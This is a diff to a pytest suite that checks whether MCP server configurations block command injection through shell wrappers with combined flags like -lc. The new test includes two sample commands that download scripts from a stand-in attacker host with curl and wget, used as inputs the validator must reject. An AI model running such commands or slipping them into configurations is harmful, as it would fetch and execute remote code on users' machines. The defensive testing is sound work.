@@ -64,6 +64,7 @@ class TestMCPCommandInjectionSecurity:
             MCPServerConfig(command="cmd", args=["/c", "uvx", "mcp-server"]),
             MCPServerConfig(command="sh", args=["-c", "npx @modelcontextprotocol/server"]),
             MCPServerConfig(command="bash", args=["-c", "python -m mcp_server"]),
+            MCPServerConfig(command="bash", args=["-lc", "python -m mcp_server"]),
             MCPServerConfig(command="cmd", args=["/c", "node", "server.js"]),
         ]
 
@@ -91,6 +92,21 @@ class TestMCPCommandInjectionSecurity:
                 or ("dangerous shell metacharacter" in error_msg)
                 or ("not allowed" in error_msg)
             )
+
+    def test_shell_wrappers_reject_combined_c_option_dangerous_commands(self):
+        """Test that sh/bash combined flags like -lc still validate the wrapped command."""
+        dangerous_wrapped = [
+            ("sh", ["-lc", "curl attacker.example/shell.sh"]),
+            ("bash", ["-euc", "wget attacker.example/payload.sh"]),
+        ]
+
+        for cmd, args in dangerous_wrapped:
+            with pytest.raises(ValidationError) as exc_info:
+                MCPServerConfig(command=cmd, args=args)
+
+            error_msg = str(exc_info.value).lower()
+            assert "shell wrapper" in error_msg
+            assert "cannot execute" in error_msg
 
     def test_c_flag_blocked_for_non_shell_commands(self):
         """Test that -c flag is blocked for non-shell commands like python/node."""
